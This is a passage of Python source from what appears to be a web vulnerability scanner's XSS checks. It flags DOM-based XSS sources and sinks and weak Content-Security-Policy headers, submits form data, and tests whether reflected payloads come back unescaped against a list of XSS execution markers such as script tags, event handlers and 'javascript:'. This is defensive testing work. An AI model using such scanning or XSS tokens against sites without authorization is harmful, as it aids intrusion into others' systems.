        all_sources = list(dict.fromkeys(found_sources + found_source_patterns))

        if not (found_sinks and all_sources):
            return []

        return [self._build_vuln(
            vuln_type=VulnType.XSS,
            title="Potential DOM-Based XSS (Static Analysis)",
            description=(
                f"The page contains dangerous JavaScript sinks "
                f"({', '.join(found_sinks[:4])}) combined with "
                f"attacker-controllable DOM sources "
                f"({', '.join(all_sources[:4])}). "
                f"When a sink receives data from a source without sanitization, "
                f"an attacker can exploit this via a crafted URL fragment or query string, "
                f"without any server-side interaction. Manual verification is required to "
                f"confirm exploitability."
            ),
            url=url,
            parameter=None,
            payload=None,
            evidence=(
                f"Sinks: {found_sinks[:5]} | "
                f"Sources: {all_sources[:5]}"
            ),
            method="GET",
            severity=Severity.LOW,
            remediation=(
                "Avoid passing URL-controlled data to dangerous sinks without sanitization. "
                "Replace innerHTML assignments with textContent where HTML is not required. "
                "Use DOMPurify to sanitize any HTML that must be rendered. "
                "Avoid eval() and similar dynamic code execution. "
                "Adopt a strict Content-Security-Policy."
            ),
            references=[
                "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                "https://portswigger.net/web-security/cross-site-scripting/dom-based",
                "https://cwe.mitre.org/data/definitions/79.html",
            ],
            cwe_id=_CWE_79,
            owasp_category=_OWASP_INJ,
            response_snippet=self._snippet(body),
            confidence="Low",
            cvss=_CVSS_XSS_DOM,
        )]

    # ------------------------------------------------------------------
    # CSP weakness flagging
    # ------------------------------------------------------------------

    def _check_csp_weakness(
        self,
        url: str,
        response: HTTPResponse,
    ) -> Optional[Vulnerability]:
        """
        If the response carries a Content-Security-Policy header that contains
        known weaknesses (unsafe-inline, wildcard, data:, or a nonce without
        strict-dynamic), raise an INFO finding to indicate that CSP provides
        no meaningful XSS mitigation.
        """
        csp = response.headers.get("content-security-policy", "")
        if not csp:
            return None

        matches = _CSP_UNSAFE_RE.findall(csp)
        if not matches:
            return None

        weakness_list = ", ".join(dict.fromkeys(m if isinstance(m, str) else m[0] for m in matches))
        return self._build_vuln(
            vuln_type=VulnType.XSS,
            title="Weak Content-Security-Policy (XSS Amplifier)",
            description=(
                f"The Content-Security-Policy header is present but contains weak directives "
                f"that negate its XSS protection: [{weakness_list}]. "
                f"'unsafe-inline' permits inline script execution defeating script-src restrictions. "
                f"A wildcard source (*) permits loading scripts from any origin. "
                f"'data:' allows script execution via data URIs. "
                f"A nonce-based policy without 'strict-dynamic' can still be bypassed via "
                f"whitelisted script-src hosts. "
                f"Any XSS vulnerability on this host is therefore fully exploitable."
            ),
            url=url,
            parameter=None,
            payload=None,
            evidence=f"CSP: {csp[:300]}",
            method="GET",
            severity=Severity.INFO,
            remediation=(
                "Remove 'unsafe-inline' and 'unsafe-eval' from script-src. "
                "Eliminate wildcard (*) sources. "
                "Prefer nonce-based or hash-based CSP with 'strict-dynamic'. "
                "Use https://csp-evaluator.withgoogle.com/ to audit your policy."
            ),
            references=[
                "https://content-security-policy.com/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
                "https://csp-evaluator.withgoogle.com/",
            ],
            cwe_id="CWE-693",
            owasp_category="A05:2021 - Security Misconfiguration",
            confidence="High",
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _submit_form(
        self,
        action: str,
        method: str,
        data: Dict[str, str],
    ) -> Optional[HTTPResponse]:
        """Submit form data via the appropriate HTTP method."""
        if method == "POST":
            return await self.client.post(action, data=data)
        # GET — pass as query params
        return await self.client.get(action, params=data)

    def _canary_unescaped(self, canary_tag: str, body: str) -> bool:
        """
        Return True if the canary tag appears in the body WITHOUT the angle
        brackets being HTML-entity-encoded (&lt; / &gt;).

        This prevents false positives on applications that safely reflect input
        as escaped HTML (e.g., showing  &lt;ws12ab34cd&gt;  in the page).
        """
        # Escaped form — should NOT be present for a vulnerable reflection
        escaped_form = f"&lt;{canary_tag}&gt;"
        raw_form     = f"<{canary_tag}>"

        if escaped_form in body:
            # If both forms appear, the raw form may be in a JS string or
            # attribute that is not HTML-escaped — consider it unescaped.
            return raw_form in body
        return canary_tag in body

    def _is_xss_unescaped(self, payload: str, body: str) -> bool:
        """
        Determine whether *payload* (or key XSS execution tokens within it)
        appears in *body* WITHOUT HTML entity encoding around the dangerous
        characters.

        Algorithm:
          1. Exact match — find the literal payload in body and verify no
             entity encoding wraps the dangerous characters in the 10-char
             context window around the match.
          2. Token scan — for each known XSS execution marker contained in the
             payload, check that its occurrence in body is not entity-escaped.

        Returns True only when an unescaped occurrence is confirmed.
        """
        lower_body    = body.lower()
        lower_payload = payload.lower()

        # ── 1. Exact payload match ────────────────────────────────────────
        if payload in body:
            idx = body.find(payload)
            # Check a generous window for entity encoding
            window_start = max(0, idx - 10)
            window_end   = min(len(body), idx + len(payload) + 10)
            surrounding  = body[window_start:window_end]
            if not _ENTITY_RE.search(surrounding):
                return True

        # ── 2. Token-level scan ───────────────────────────────────────────
        # Ordered from highest-confidence (script/event execution) to lowest.
        xss_exec_markers = [
            # Script and markup sinks
            "<script",        "</script",
            "<svg",           "<img",        "<iframe",
            "<details",       "<input",      "<video",
            "<audio",         "<marquee",    "<body",
            "<object",        "<embed",      "<math",
            "<form",          "<button",
            # Event handlers
            "onerror=",       "onload=",     "onfocus=",
            "onmouseover=",   "ontoggle=",   "onstart=",
            "onclick=",       "onmouseup=",  "onmousedown=",
            "onfocusin=",     "onanimationstart=",
            # JS execution contexts
            "javascript:",    "expression(", "eval(",
            # Payloads that confirm JS execution
            "alert(",         "confirm(",    "prompt(",
            "alert`",
            # autofocus (triggers onfocus without user action)
            "autofocus",
        ]

        for marker in xss_exec_markers:
            if marker not in lower_payload:
                continue    # This marker isn't in the payload — skip

            search_pos = 0
            while True:
                idx = lower_body.find(marker, search_pos)
                if idx == -1:
                    break
                search_pos = idx + 1

                window_start = max(0, idx - 10)
                window_end   = min(len(body), idx + len(marker) + 10)
                surrounding  = body[window_start:window_end]

                # Reject if entity-encoded
                if _ENTITY_RE.search(surrounding):
                    continue

                # Confirm at least one dangerous char is unescaped nearby
                snippet_check = body[max(0, idx - 2): idx + len(marker) + 2]
                has_dangerous = any(c in snippet_check for c in _DANGEROUS_CHARS)
                if has_dangerous:
                    return True

                # Markers like 'alert(' don't necessarily need angle brackets
                if marker in ("alert(", "confirm(", "prompt(", "alert`",
                              "javascript:", "expression(", "eval(",
                              "autofocus"):
                    return True

        return False
